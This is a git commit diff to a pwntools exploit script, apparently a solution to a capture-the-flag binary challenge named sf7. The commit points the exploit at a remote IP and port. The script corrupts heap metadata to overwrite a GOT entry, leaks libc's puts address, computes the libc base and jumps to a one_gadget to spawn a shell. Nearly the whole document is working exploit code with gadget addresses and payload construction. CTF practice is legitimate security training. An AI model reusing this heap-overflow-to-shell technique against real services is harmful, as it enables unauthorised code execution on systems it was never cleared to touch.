28ef95f4ee9a77c191d1b056969a82ab473e25a3
Minjea Lee <gabe0529@naver.com>
2022-03-30 12:25:50 +0900

    sf7 modify

--- sf7/ex_sf7.py
+++ sf7/ex_sf7.py
@@ -1,12 +1,15 @@
 from pwn import *
 
-p = process('./sf7')
+# p = process('./sf7')
+p = remote("129.154.197.81", 1800)
 e = ELF('./sf7')
+# 129.154.197.81:1800
+
 
 pop_rdi = 0x00000000004010d3
 
 #log
-context.log_level = 'debug'
+# context.log_level = 'debug'
 
 def create(size, content):
     p.recvuntil("> ")
@@ -53,7 +56,7 @@ pay += b'B'*0x8 + p64(0)
 pay += p64(0) + p64(0x31)
 pay += p64(0) + p64(e.got['puts'])
 pay += p64(e.got['puts'])
-input()
+
 modify('BBBBBBBB\x00', pay)
 
 show()
@@ -61,17 +64,20 @@ p.recvuntil("[5]\n")
 libc_puts = u64(p.recv(6) + b'\x00\x00')
 print(hex(libc_puts))
 libc_base = libc_puts - 0x6f6a0
-print(hex(libc_base))
-sys = libc_base + 0x453a0
-binsh = libc_base + 0x18ce57
+# print(hex(libc_base))
+# sys = libc_base + 0x453a0
+# binsh = libc_base + 0x18ce57
 
 one = libc_base + 0xf1247
 
-change(p64(libc_puts))
+change(p64(libc_puts))  # 
 
+# -----------------------
 # pay = b''
 # pay += p64(pop_rdi) + p64(binsh)
 # pay += p64(sys)
+# ----------------------- 
+
 
 pay = b''
 pay += p64(one)
